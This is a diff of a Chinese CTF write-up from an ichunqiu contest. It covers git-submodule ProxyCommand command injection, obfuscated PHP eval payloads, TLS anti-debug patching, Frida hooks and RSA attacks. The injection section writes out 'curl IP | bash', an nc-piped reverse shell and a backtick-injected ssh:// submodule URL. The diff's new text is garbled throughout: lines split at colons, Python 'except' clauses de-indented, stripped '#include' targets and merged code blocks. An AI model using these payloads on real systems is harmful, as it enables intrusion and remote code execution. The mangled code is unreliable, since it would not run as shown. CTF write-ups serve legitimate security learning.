@@ -14,7 +14,8 @@ OpenSSH的配置项ProxyCommand里允许执行shell命令。而%h参数将引用
 ~/.ssh/config内容：
 
 host *.ichunqiu.com
-  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
+  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:
+8080 %h %p
 
 部署方式：
 
@@ -90,7 +91,8 @@ for i in file_list_decoded:
     try:
         base64_data = re.search(r"用户(d+)_([w+-=]{4})的外卖", i).groups()
         base64_data_list.append(base64_data)
-    except:
+    
+except:
         # print(i)
         pass
 
@@ -198,114 +200,229 @@ int __stdcall TlsCallback_0(int a1, int a2, int a3)
 
 跟进结构体stru_403828可以定位到异常处理例程，这里不再跟进，对TLS进行patch还原，nop范围如下：
 
-.text:004018A0 ; int __stdcall TlsCallback_0(int, int, int)
-.text:004018A0 public TlsCallback_0
-.text:004018A0 TlsCallback_0 proc near ; DATA XREF: .rdata:TlsCallbacks↓o
-.text:004018A0
-.text:004018A0 var_20= dword ptr -20h
-.text:004018A0 var_1C= dword ptr -1Ch
-.text:004018A0 ms_exc= CPPEH_RECORD ptr -18h
-.text:004018A0
-.text:004018A0 ; __unwind { // __except_handler4
-.text:004018A0 55 push ebp
-.text:004018A1 8B EC mov ebp, esp
-.text:004018A3 6A FE push 0FFFFFFFEh ; -------------nop
-.text:004018A5 68 28 38 40 00 push offset stru_403828
-.text:004018AA 68 5F 21 40 00 push offset __except_handler4
-.text:004018AF 64 A1 00 00 00 00 mov eax, large fs:0
-.text:004018B5 50 push eax
-.text:004018B6 83 C4 F0 add esp, 0FFFFFFF0h
-.text:004018B9 53 push ebx
-.text:004018BA 56 push esi
-.text:004018BB 57 push edi
-.text:004018BC A1 04 50 40 00 mov eax, ___security_cookie
-.text:004018C1 31 45 F8 xor [ebp+ms_exc.registration.ScopeTable], eax
-.text:004018C4 33 C5 xor eax, ebp
-.text:004018C6 50 push eax
-.text:004018C7 8D 45 F0 lea eax, [ebp+ms_exc.registration]
-.text:004018CA 64 A3 00 00 00 00 mov large fs:0, eax
-.text:004018D0 89 65 E8 mov [ebp+ms_exc.old_esp], esp
-.text:004018D3 0F B6 05 34 50 40 00 movzx eax, byte_405034
-.text:004018DA 85 C0 test eax, eax
-.text:004018DC 74 79 jz short loc_401957
-.text:004018DC
-.text:004018DE ; __try { // __except at loc_401916
-.text:004018DE C7 45 FC 00 00 00 00 mov [ebp+ms_exc.registration.TryLevel], 0
-.text:004018E5 FF 15 44 30 40 00 call ds:IsDebuggerPresent
-.text:004018E5
-.text:004018EB 85 C0 test eax, eax
-.text:004018ED 74 08 jz short loc_4018F7
-.text:004018ED
-.text:004018EF 6A 00 push 0 ; Code
-.text:004018F1 FF 15 F4 30 40 00 call ds:__imp_exit
-.text:004018F1
-.text:004018F7 ; ---------------------------------------------------------------------------
-.text:004018F7
-.text:004018F7 loc_4018F7: ; CODE XREF: TlsCallback_0+4D↑j
-.text:004018F7 C7 45 E0 00 00 00 00 mov [ebp+var_20], 0
-.text:004018FE 8B 4D E0 mov ecx, [ebp+var_20]
-.text:00401901 C7 01 2A 00 00 00 mov dword ptr [ecx], 2Ah ; '*'
-.text:00401901 ; } // starts at 4018DE
-.text:00401907 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
-.text:0040190E EB 40 jmp short loc_401950
-.text:0040190E
-.text:00401910 ; ---------------------------------------------------------------------------
-.text:00401910
-.text:00401910 loc_401910: ; DATA XREF: .rdata:stru_403828↓o
-.text:00401910 ; __except filter // owned by 4018DE
-.text:00401910 B8 01 00 00 00 mov eax, 1
-.text:00401915 C3 retn
-.text:00401915
-.text:00401916 ; ---------------------------------------------------------------------------
-.text:00401916
-.text:00401916 loc_401916: ; DATA XREF: .rdata:stru_403828↓o
-.text:00401916 ; __except(loc_401910) // owned by 4018DE ; --------------------nop
-.text:00401916 8B 65 E8 mov esp, [ebp+ms_exc.old_esp]
-.text:00401919 C7 45 E4 00 00 00 00 mov [ebp+var_1C], 0
-.text:00401920 EB 09 jmp short loc_40192B
-.text:00401920
-.text:00401922 ; ---------------------------------------------------------------------------
-.text:00401922
-.text:00401922 loc_401922: ; CODE XREF: TlsCallback_0+A7↓j
-.text:00401922 8B 55 E4 mov edx, [ebp+var_1C]
-.text:00401925 83 C2 01 add edx, 1
-.text:00401928 89 55 E4 mov [ebp+var_1C], edx
-.text:00401928
-.text:0040192B
-.text:0040192B loc_40192B: ; CODE XREF: TlsCallback_0+80↑j
-.text:0040192B 83 7D E4 17 cmp [ebp+var_1C], 17h
-.text:0040192F 7D 18 jge short loc_401949
-.text:0040192F
-.text:00401931 8B 45 E4 mov eax, [ebp+var_1C]
-.text:00401934 0F BE 88 1C 50 40 00 movsx ecx, byte_40501C[eax]
-.text:0040193B 83 F1 22 xor ecx, 22h
-.text:0040193E 8B 55 E4 mov edx, [ebp+var_1C]
-.text:00401941 88 8A 1C 50 40 00 mov byte_40501C[edx], cl
-.text:00401947 EB D9 jmp short loc_401922
-.text:00401947
-.text:00401949 ; ---------------------------------------------------------------------------
-.text:00401949
-.text:00401949 loc_401949: ; CODE XREF: TlsCallback_0+8F↑j
-.text:00401949 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
-.text:00401949
-.text:00401950
-.text:00401950 loc_401950: ; CODE XREF: TlsCallback_0+6E↑j
-.text:00401950 C6 05 34 50 40 00 00 mov byte_405034, 0
-.text:00401950
-.text:00401957
-.text:00401957 loc_401957: ; CODE XREF: TlsCallback_0+3C↑j
-.text:00401957 8B 4D F0 mov ecx, [ebp+ms_exc.registration.Next]
-.text:0040195A 64 89 0D 00 00 00 00 mov large fs:0, ecx
-.text:00401961 59 pop ecx ; ------nop
-.text:00401962 5F pop edi
-.text:00401963 5E pop esi
-.text:00401964 5B pop ebx ; -----nop
-.text:00401965 8B E5 mov esp, ebp
-.text:00401967 5D pop ebp
-.text:00401968 C2 0C 00 retn 0Ch
-.text:00401968 ; } // starts at 4018A0
-.text:00401968
-.text:00401968 TlsCallback_0 endp
+.text:
+004018A0 ; int __stdcall TlsCallback_0(int, int, int)
+.text:
+004018A0 public TlsCallback_0
+.text:
+004018A0 TlsCallback_0 proc near ; DATA XREF: .rdata:
+TlsCallbacks↓o
+.text:
+004018A0
+.text:
+004018A0 var_20= dword ptr -20h
+.text:
+004018A0 var_1C= dword ptr -1Ch
+.text:
+004018A0 ms_exc= CPPEH_RECORD ptr -18h
+.text:
+004018A0
+.text:
+004018A0 ; __unwind { // __except_handler4
+.text:
+004018A0 55 push ebp
+.text:
+004018A1 8B EC mov ebp, esp
+.text:
+004018A3 6A FE push 0FFFFFFFEh ; -------------nop
+.text:
+004018A5 68 28 38 40 00 push offset stru_403828
+.text:
+004018AA 68 5F 21 40 00 push offset __except_handler4
+.text:
+004018AF 64 A1 00 00 00 00 mov eax, large fs:0
+.text:
+004018B5 50 push eax
+.text:
+004018B6 83 C4 F0 add esp, 0FFFFFFF0h
+.text:
+004018B9 53 push ebx
+.text:
+004018BA 56 push esi
+.text:
+004018BB 57 push edi
+.text:
+004018BC A1 04 50 40 00 mov eax, ___security_cookie
+.text:
+004018C1 31 45 F8 xor [ebp+ms_exc.registration.ScopeTable], eax
+.text:
+004018C4 33 C5 xor eax, ebp
+.text:
+004018C6 50 push eax
+.text:
+004018C7 8D 45 F0 lea eax, [ebp+ms_exc.registration]
+.text:
+004018CA 64 A3 00 00 00 00 mov large fs:0, eax
+.text:
+004018D0 89 65 E8 mov [ebp+ms_exc.old_esp], esp
+.text:
+004018D3 0F B6 05 34 50 40 00 movzx eax, byte_405034
+.text:
+004018DA 85 C0 test eax, eax
+.text:
+004018DC 74 79 jz short loc_401957
+.text:
+004018DC
+.text:
+004018DE ; __try { // __
+except at loc_401916
+.text:
+004018DE C7 45 FC 00 00 00 00 mov [ebp+ms_exc.registration.TryLevel], 0
+.text:
+004018E5 FF 15 44 30 40 00 call ds:
+IsDebuggerPresent
+.text:
+004018E5
+.text:
+004018EB 85 C0 test eax, eax
+.text:
+004018ED 74 08 jz short loc_4018F7
+.text:
+004018ED
+.text:
+004018EF 6A 00 push 0 ; Code
+.text:
+004018F1 FF 15 F4 30 40 00 call ds:
+__imp_exit
+.text:
+004018F1
+.text:
+004018F7 ; ---------------------------------------------------------------------------
+.text:
+004018F7
+.text:
+004018F7 loc_4018F7: ; CODE XREF: TlsCallback_0+4D↑j
+.text:
+004018F7 C7 45 E0 00 00 00 00 mov [ebp+var_20], 0
+.text:
+004018FE 8B 4D E0 mov ecx, [ebp+var_20]
+.text:
+00401901 C7 01 2A 00 00 00 mov dword ptr [ecx], 2Ah ; '*'
+.text:
+00401901 ; } // starts at 4018DE
+.text:
+00401907 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
+.text:
+0040190E EB 40 jmp short loc_401950
+.text:
+0040190E
+.text:
+00401910 ; ---------------------------------------------------------------------------
+.text:
+00401910
+.text:
+00401910 loc_401910: ; DATA XREF: .rdata:
+stru_403828↓o
+.text:
+00401910 ; __
+except filter // owned by 4018DE
+.text:
+00401910 B8 01 00 00 00 mov eax, 1
+.text:
+00401915 C3 retn
+.text:
+00401915
+.text:
+00401916 ; ---------------------------------------------------------------------------
+.text:
+00401916
+.text:
+00401916 loc_401916: ; DATA XREF: .rdata:
+stru_403828↓o
+.text:
+00401916 ; __except(loc_401910) // owned by 4018DE ; --------------------nop
+.text:
+00401916 8B 65 E8 mov esp, [ebp+ms_exc.old_esp]
+.text:
+00401919 C7 45 E4 00 00 00 00 mov [ebp+var_1C], 0
+.text:
+00401920 EB 09 jmp short loc_40192B
+.text:
+00401920
+.text:
+00401922 ; ---------------------------------------------------------------------------
+.text:
+00401922
+.text:
+00401922 loc_401922: ; CODE XREF: TlsCallback_0+A7↓j
+.text:
+00401922 8B 55 E4 mov edx, [ebp+var_1C]
+.text:
+00401925 83 C2 01 add edx, 1
+.text:
+00401928 89 55 E4 mov [ebp+var_1C], edx
+.text:
+00401928
+.text:
+0040192B
+.text:
+0040192B loc_40192B: ; CODE XREF: TlsCallback_0+80↑j
+.text:
+0040192B 83 7D E4 17 cmp [ebp+var_1C], 17h
+.text:
+0040192F 7D 18 jge short loc_401949
+.text:
+0040192F
+.text:
+00401931 8B 45 E4 mov eax, [ebp+var_1C]
+.text:
+00401934 0F BE 88 1C 50 40 00 movsx ecx, byte_40501C[eax]
+.text:
+0040193B 83 F1 22 xor ecx, 22h
+.text:
+0040193E 8B 55 E4 mov edx, [ebp+var_1C]
+.text:
+00401941 88 8A 1C 50 40 00 mov byte_40501C[edx], cl
+.text:
+00401947 EB D9 jmp short loc_401922
+.text:
+00401947
+.text:
+00401949 ; ---------------------------------------------------------------------------
+.text:
+00401949
+.text:
+00401949 loc_401949: ; CODE XREF: TlsCallback_0+8F↑j
+.text:
+00401949 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
+.text:
+00401949
+.text:
+00401950
+.text:
+00401950 loc_401950: ; CODE XREF: TlsCallback_0+6E↑j
+.text:
+00401950 C6 05 34 50 40 00 00 mov byte_405034, 0
+.text:
+00401950
+.text:
+00401957
+.text:
+00401957 loc_401957: ; CODE XREF: TlsCallback_0+3C↑j
+.text:
+00401957 8B 4D F0 mov ecx, [ebp+ms_exc.registration.Next]
+.text:
+0040195A 64 89 0D 00 00 00 00 mov large fs:0, ecx
+.text:
+00401961 59 pop ecx ; ------nop
+.text:
+00401962 5F pop edi
+.text:
+00401963 5E pop esi
+.text:
+00401964 5B pop ebx ; -----nop
+.text:
+00401965 8B E5 mov esp, ebp
+.text:
+00401967 5D pop ebp
+.text:
+00401968 C2 0C 00 retn 0Ch
+.text:
+00401968 ; } // starts at 4018A0
+.text:
+00401968
+.text:
+00401968 TlsCallback_0 endp
 
 还原后代码如下：
 
@@ -331,7 +448,8 @@ def xor_encrypt(input_file_path, output_file_path, key):
 
             with open(output_file_path, 'wb') as output_file:
                 output_file.write(encrypted_content)
-    except Exception as e:
+    
+except Exception as e:
         print(str(e))
 
 input_file_path = 'DATA101.bin'
@@ -364,7 +482,8 @@ function main(){
     HookGetProcAddress();
 }
 function HookGetProcAddress(){
-    Interceptor.attach(Process.enumerateModules()[0].base.add(0x00001BB0),{//Process.enumerateModules()[0].base.add(0x00001BB0)为GetProcAddress_0地址 RVA:00001BB0
+    Interceptor.attach(Process.enumerateModules()[0].base.add(0x00001BB0),{//Process.enumerateModules()[0].base.add(0x00001BB0)为GetProcAddress_0地址 RVA:
+00001BB0
         onEnter(args){
             let ordinal = args[1].toInt32();
             console.warn(`ordinal--->${ordinal}`);
@@ -390,7 +509,7 @@ setImmediate(main)
 
 或使用如下类似脚本完成AES_CBC_256解密
 
-#include <iostream>
+#include 
 #include <windows.h>
 
 using namespace std;
@@ -444,8 +563,11 @@ int main()
   if (!CryptDecrypt(hKey, 0, 1, 0, (BYTE*)cipher, &cipherLen)) {
   }
 
-  std::cout.write(reinterpret_cast<char*>(cipher), cipherLen);
-  std::cout << std::endl;
+  std::
+cout.write(reinterpret_cast<char*>(cipher), cipherLen);
+  std::
+cout << std::
+endl;
 
   return 0;
  }
@@ -466,10 +588,15 @@ coos
 这里推荐使用脚本去除，因为模板都是一样的。
 
 #define AStupid_GetInteger(in, out){
-string Integer = std::to_string(in);
+string Integer = std::
+to_string(in);
 int ret = 0;
-std::string::reverse_iterator rbegin = Integer.rbegin();
-std::string::reverse_iterator rend = Integer.rend();
+std::
+string::
+reverse_iterator rbegin = Integer.rbegin();
+std::
+string::
+reverse_iterator rend = Integer.rend();
 int i = 0;
 while ((rbegin != rend) &&
     ((*rbegin == '0') ||
@@ -969,7 +1096,7 @@ def boneh_durfee(pol, modulus, mm, tt, XX, YY):
     """
 
     # substitution (Herrman and May)
-    PR.<u,x,y> = PolynomialRing(ZZ)
+    PR. = PolynomialRing(ZZ)
     Q = PR.quotient(x * y + 1 - u)  # u = xy + 1
     polZ = Q(pol).lift()
 
@@ -1444,7 +1571,8 @@ for j in tqdm(range(250)):
                 P_Q_number = i1
                 print(i1)
                 break
-        except:
+        
+except:
             pass
     if P_Q_number == 0:
         #         print(f'The {j} is failed')
@@ -1475,7 +1603,8 @@ for j in tqdm(range(250)):
                 num = T
                 print('Key = ', Key)
                 break
-        except:
+        
+except:
             pass
 
     C = int(C)
@@ -1602,45 +1731,21 @@ https://www.ichunqiu.com/competition
 
 ```
 host *.ichunqiu.com
-  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
-```
-
-
-
-```
+  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:
+8080 %h %p
 --recurse-submodules
 # 在克隆Git仓库的时候，同时初始化并更新仓库中的所有子模块
-```
-
-
-
-```
 ssh://`命令语句`foo.ichunqiu.com/bar
-```
-
-
-
-```
 curl IP | bash
 nc IP PORT1 |bash|nc IP PORT2
 bash exp.sh
 # 命令中出现/会解析错误，可以把命令写入exp.sh再执行
 cat /flag > /var/www/html/flag
-```
-
-
-
-```
 git clone https://github.com/vin01/poc-proxycommand-vulnerable
 cd poc-proxycommand-vulnerable && vi .gitmodules
 # 修改url里的命令语句
 git add .
 git commit -m "gamelab"
-```
-
-
-
-```
 mkdir gamelab && cd gamelab
 git init .
 # 没法直接添加不存在的地址
@@ -1649,11 +1754,6 @@ vi .gitmodules
 # 修改url里的命令语句
 git add .
 git commit -m "gamelab"
-```
-
-
-
-```
 import base64
 import re
 import zipfile
@@ -1675,7 +1775,8 @@ for i in file_list_decoded:
     try:
         base64_data = re.search(r"用户(d+)_([w+-=]{4})的外卖", i).groups()
         base64_data_list.append(base64_data)
-    except:
+    
+except:
         # print(i)
         pass
 
@@ -1689,11 +1790,6 @@ base64_data_str_raw = ''.join([i[1] for i in base64_data_list_sorted])
 # 根据提示替换掉其中的-为/
 base64_data_str = base64_data_str_raw.replace('-', '/')
 print(base64_data_str)
-```
-
-
-
-```
 # 添加文件头
 zip = "504b03"
 base64_data_str = base64.b64encode(bytes.fromhex(zip)).decode() + base64_data_str
@@ -1701,17 +1797,7 @@ base64_data_str = base64.b64encode(bytes.fromhex(zip)).decode() + base64_dat
 # 保存压缩包
 with open("key.zip", "wb") as f:
     f.write(base64.b64decode(base64_data_str))
-```
-
-
-
-```
 flag{W1sh_y0u_AaaAaaaa
-```
-
-
-
-```
 <?php  
 $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");  
 $O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};  
@@ -1719,17 +1805,7 @@ $O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO
 $O0O000="NoJpuRUVQdeXLBwFaEvMPhtCIxlAYrHDsOynWScjTKkZgmbqGifzkLexbWjMsNrBOgcRInyZCdaAzEqUfvJDGTtuwQFKhiVmSXPoYlpHCD9cIJUimBmdPAdurXqbmXEdNYjLfXRHmhf0B2Wqf29VmQSuMhguNRZ4rqeKWVkiWA9gjnWyPRNjTJWiMnG4Nj5HN3s4WnNCFuxeF2qzmVqhkYa2huxmruxMIKR5MVmMMVa4MXL5MHg0FXknsjn9CQFxiQV7zUL/CS==";  
 echo htmlspecialchars('?>'.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));  
 ?>
-```
-
-
-
-```
 ?><?php eval(gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA=='))); ?>
-```
-
-
-
-```
 <?php  
 //放入已经加密的PHP内容  
 $a = "eval(gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==')));";  
@@ -1747,11 +1823,6 @@ function decodephp($a)  
 //这里注意要加htmlspecialchars，我看好多文章没写  
 echo htmlspecialchars(decodephp($a));  
 ?>
-```
-
-
-
-```
 int __stdcall TlsCallback_0(int a1, int a2, int a3)
 {
   int result; // eax
@@ -1764,124 +1835,229 @@ int __stdcall TlsCallback_0(int a1, int a2, int a3)
   }
   return result;
 }
-```
-
-
-
-```
-.text:004018A0 ; int __stdcall TlsCallback_0(int, int, int)
-.text:004018A0 public TlsCallback_0
-.text:004018A0 TlsCallback_0 proc near ; DATA XREF: .rdata:TlsCallbacks↓o
-.text:004018A0
-.text:004018A0 var_20= dword ptr -20h
-.text:004018A0 var_1C= dword ptr -1Ch
-.text:004018A0 ms_exc= CPPEH_RECORD ptr -18h
-.text:004018A0
-.text:004018A0 ; __unwind { // __except_handler4
-.text:004018A0 55 push ebp
-.text:004018A1 8B EC mov ebp, esp
-.text:004018A3 6A FE push 0FFFFFFFEh ; -------------nop
-.text:004018A5 68 28 38 40 00 push offset stru_403828
-.text:004018AA 68 5F 21 40 00 push offset __except_handler4
-.text:004018AF 64 A1 00 00 00 00 mov eax, large fs:0
-.text:004018B5 50 push eax
-.text:004018B6 83 C4 F0 add esp, 0FFFFFFF0h
-.text:004018B9 53 push ebx
-.text:004018BA 56 push esi
-.text:004018BB 57 push edi
-.text:004018BC A1 04 50 40 00 mov eax, ___security_cookie
-.text:004018C1 31 45 F8 xor [ebp+ms_exc.registration.ScopeTable], eax
-.text:004018C4 33 C5 xor eax, ebp
-.text:004018C6 50 push eax
-.text:004018C7 8D 45 F0 lea eax, [ebp+ms_exc.registration]
-.text:004018CA 64 A3 00 00 00 00 mov large fs:0, eax
-.text:004018D0 89 65 E8 mov [ebp+ms_exc.old_esp], esp
-.text:004018D3 0F B6 05 34 50 40 00 movzx eax, byte_405034
-.text:004018DA 85 C0 test eax, eax
-.text:004018DC 74 79 jz short loc_401957
-.text:004018DC
-.text:004018DE ; __try { // __except at loc_401916
-.text:004018DE C7 45 FC 00 00 00 00 mov [ebp+ms_exc.registration.TryLevel], 0
-.text:004018E5 FF 15 44 30 40 00 call ds:IsDebuggerPresent
-.text:004018E5
-.text:004018EB 85 C0 test eax, eax
-.text:004018ED 74 08 jz short loc_4018F7
-.text:004018ED
-.text:004018EF 6A 00 push 0 ; Code
-.text:004018F1 FF 15 F4 30 40 00 call ds:__imp_exit
-.text:004018F1
-.text:004018F7 ; ---------------------------------------------------------------------------
-.text:004018F7
-.text:004018F7 loc_4018F7: ; CODE XREF: TlsCallback_0+4D↑j
-.text:004018F7 C7 45 E0 00 00 00 00 mov [ebp+var_20], 0
-.text:004018FE 8B 4D E0 mov ecx, [ebp+var_20]
-.text:00401901 C7 01 2A 00 00 00 mov dword ptr [ecx], 2Ah ; '*'
-.text:00401901 ; } // starts at 4018DE
-.text:00401907 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
-.text:0040190E EB 40 jmp short loc_401950
-.text:0040190E
-.text:00401910 ; ---------------------------------------------------------------------------
-.text:00401910
-.text:00401910 loc_401910: ; DATA XREF: .rdata:stru_403828↓o
-.text:00401910 ; __except filter // owned by 4018DE
-.text:00401910 B8 01 00 00 00 mov eax, 1
-.text:00401915 C3 retn
-.text:00401915
-.text:00401916 ; ---------------------------------------------------------------------------
-.text:00401916
-.text:00401916 loc_401916: ; DATA XREF: .rdata:stru_403828↓o
-.text:00401916 ; __except(loc_401910) // owned by 4018DE ; --------------------nop
-.text:00401916 8B 65 E8 mov esp, [ebp+ms_exc.old_esp]
-.text:00401919 C7 45 E4 00 00 00 00 mov [ebp+var_1C], 0
-.text:00401920 EB 09 jmp short loc_40192B
-.text:00401920
-.text:00401922 ; ---------------------------------------------------------------------------
-.text:00401922
-.text:00401922 loc_401922: ; CODE XREF: TlsCallback_0+A7↓j
-.text:00401922 8B 55 E4 mov edx, [ebp+var_1C]
-.text:00401925 83 C2 01 add edx, 1
-.text:00401928 89 55 E4 mov [ebp+var_1C], edx
-.text:00401928
-.text:0040192B
-.text:0040192B loc_40192B: ; CODE XREF: TlsCallback_0+80↑j
-.text:0040192B 83 7D E4 17 cmp [ebp+var_1C], 17h
-.text:0040192F 7D 18 jge short loc_401949
-.text:0040192F
-.text:00401931 8B 45 E4 mov eax, [ebp+var_1C]
-.text:00401934 0F BE 88 1C 50 40 00 movsx ecx, byte_40501C[eax]
-.text:0040193B 83 F1 22 xor ecx, 22h
-.text:0040193E 8B 55 E4 mov edx, [ebp+var_1C]
-.text:00401941 88 8A 1C 50 40 00 mov byte_40501C[edx], cl
-.text:00401947 EB D9 jmp short loc_401922
-.text:00401947
-.text:00401949 ; ---------------------------------------------------------------------------
-.text:00401949
-.text:00401949 loc_401949: ; CODE XREF: TlsCallback_0+8F↑j
-.text:00401949 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
-.text:00401949
-.text:00401950
-.text:00401950 loc_401950: ; CODE XREF: TlsCallback_0+6E↑j
-.text:00401950 C6 05 34 50 40 00 00 mov byte_405034, 0
-.text:00401950
-.text:00401957
-.text:00401957 loc_401957: ; CODE XREF: TlsCallback_0+3C↑j
-.text:00401957 8B 4D F0 mov ecx, [ebp+ms_exc.registration.Next]
-.text:0040195A 64 89 0D 00 00 00 00 mov large fs:0, ecx
-.text:00401961 59 pop ecx ; ------nop
-.text:00401962 5F pop edi
-.text:00401963 5E pop esi
-.text:00401964 5B pop ebx ; -----nop
-.text:00401965 8B E5 mov esp, ebp
-.text:00401967 5D pop ebp
-.text:00401968 C2 0C 00 retn 0Ch
-.text:00401968 ; } // starts at 4018A0
-.text:00401968
-.text:00401968 TlsCallback_0 endp
-```
-
-
-
-```
+.text:
+004018A0 ; int __stdcall TlsCallback_0(int, int, int)
+.text:
+004018A0 public TlsCallback_0
+.text:
+004018A0 TlsCallback_0 proc near ; DATA XREF: .rdata:
+TlsCallbacks↓o
+.text:
+004018A0
+.text:
+004018A0 var_20= dword ptr -20h
+.text:
+004018A0 var_1C= dword ptr -1Ch
+.text:
+004018A0 ms_exc= CPPEH_RECORD ptr -18h
+.text:
+004018A0
+.text:
+004018A0 ; __unwind { // __except_handler4
+.text:
+004018A0 55 push ebp
+.text:
+004018A1 8B EC mov ebp, esp
+.text:
+004018A3 6A FE push 0FFFFFFFEh ; -------------nop
+.text:
+004018A5 68 28 38 40 00 push offset stru_403828
+.text:
+004018AA 68 5F 21 40 00 push offset __except_handler4
+.text:
+004018AF 64 A1 00 00 00 00 mov eax, large fs:0
+.text:
+004018B5 50 push eax
+.text:
+004018B6 83 C4 F0 add esp, 0FFFFFFF0h
+.text:
+004018B9 53 push ebx
+.text:
+004018BA 56 push esi
+.text:
+004018BB 57 push edi
+.text:
+004018BC A1 04 50 40 00 mov eax, ___security_cookie
+.text:
+004018C1 31 45 F8 xor [ebp+ms_exc.registration.ScopeTable], eax
+.text:
+004018C4 33 C5 xor eax, ebp
+.text:
+004018C6 50 push eax
+.text:
+004018C7 8D 45 F0 lea eax, [ebp+ms_exc.registration]
+.text:
+004018CA 64 A3 00 00 00 00 mov large fs:0, eax
+.text:
+004018D0 89 65 E8 mov [ebp+ms_exc.old_esp], esp
+.text:
+004018D3 0F B6 05 34 50 40 00 movzx eax, byte_405034
+.text:
+004018DA 85 C0 test eax, eax
+.text:
+004018DC 74 79 jz short loc_401957
+.text:
+004018DC
+.text:
+004018DE ; __try { // __
+except at loc_401916
+.text:
+004018DE C7 45 FC 00 00 00 00 mov [ebp+ms_exc.registration.TryLevel], 0
+.text:
+004018E5 FF 15 44 30 40 00 call ds:
+IsDebuggerPresent
+.text:
+004018E5
+.text:
+004018EB 85 C0 test eax, eax
+.text:
+004018ED 74 08 jz short loc_4018F7
+.text:
+004018ED
+.text:
+004018EF 6A 00 push 0 ; Code
+.text:
+004018F1 FF 15 F4 30 40 00 call ds:
+__imp_exit
+.text:
+004018F1
+.text:
+004018F7 ; ---------------------------------------------------------------------------
+.text:
+004018F7
+.text:
+004018F7 loc_4018F7: ; CODE XREF: TlsCallback_0+4D↑j
+.text:
+004018F7 C7 45 E0 00 00 00 00 mov [ebp+var_20], 0
+.text:
+004018FE 8B 4D E0 mov ecx, [ebp+var_20]
+.text:
+00401901 C7 01 2A 00 00 00 mov dword ptr [ecx], 2Ah ; '*'
+.text:
+00401901 ; } // starts at 4018DE
+.text:
+00401907 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
+.text:
+0040190E EB 40 jmp short loc_401950
+.text:
+0040190E
+.text:
+00401910 ; ---------------------------------------------------------------------------
+.text:
+00401910
+.text:
+00401910 loc_401910: ; DATA XREF: .rdata:
+stru_403828↓o
+.text:
+00401910 ; __
+except filter // owned by 4018DE
+.text:
+00401910 B8 01 00 00 00 mov eax, 1
+.text:
+00401915 C3 retn
+.text:
+00401915
+.text:
+00401916 ; ---------------------------------------------------------------------------
+.text:
+00401916
+.text:
+00401916 loc_401916: ; DATA XREF: .rdata:
+stru_403828↓o
+.text:
+00401916 ; __except(loc_401910) // owned by 4018DE ; --------------------nop
+.text:
+00401916 8B 65 E8 mov esp, [ebp+ms_exc.old_esp]
+.text:
+00401919 C7 45 E4 00 00 00 00 mov [ebp+var_1C], 0
+.text:
+00401920 EB 09 jmp short loc_40192B
+.text:
+00401920
+.text:
+00401922 ; ---------------------------------------------------------------------------
+.text:
+00401922
+.text:
+00401922 loc_401922: ; CODE XREF: TlsCallback_0+A7↓j
+.text:
+00401922 8B 55 E4 mov edx, [ebp+var_1C]
+.text:
+00401925 83 C2 01 add edx, 1
+.text:
+00401928 89 55 E4 mov [ebp+var_1C], edx
+.text:
+00401928
+.text:
+0040192B
+.text:
+0040192B loc_40192B: ; CODE XREF: TlsCallback_0+80↑j
+.text:
+0040192B 83 7D E4 17 cmp [ebp+var_1C], 17h
+.text:
+0040192F 7D 18 jge short loc_401949
+.text:
+0040192F
+.text:
+00401931 8B 45 E4 mov eax, [ebp+var_1C]
+.text:
+00401934 0F BE 88 1C 50 40 00 movsx ecx, byte_40501C[eax]
+.text:
+0040193B 83 F1 22 xor ecx, 22h
+.text:
+0040193E 8B 55 E4 mov edx, [ebp+var_1C]
+.text:
+00401941 88 8A 1C 50 40 00 mov byte_40501C[edx], cl
+.text:
+00401947 EB D9 jmp short loc_401922
+.text:
+00401947
+.text:
+00401949 ; ---------------------------------------------------------------------------
+.text:
+00401949
+.text:
+00401949 loc_401949: ; CODE XREF: TlsCallback_0+8F↑j
+.text:
+00401949 C7 45 FC FE FF FF FF mov [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
+.text:
+00401949
+.text:
+00401950
+.text:
+00401950 loc_401950: ; CODE XREF: TlsCallback_0+6E↑j
+.text:
+00401950 C6 05 34 50 40 00 00 mov byte_405034, 0
+.text:
+00401950
+.text:
+00401957
+.text:
+00401957 loc_401957: ; CODE XREF: TlsCallback_0+3C↑j
+.text:
+00401957 8B 4D F0 mov ecx, [ebp+ms_exc.registration.Next]
+.text:
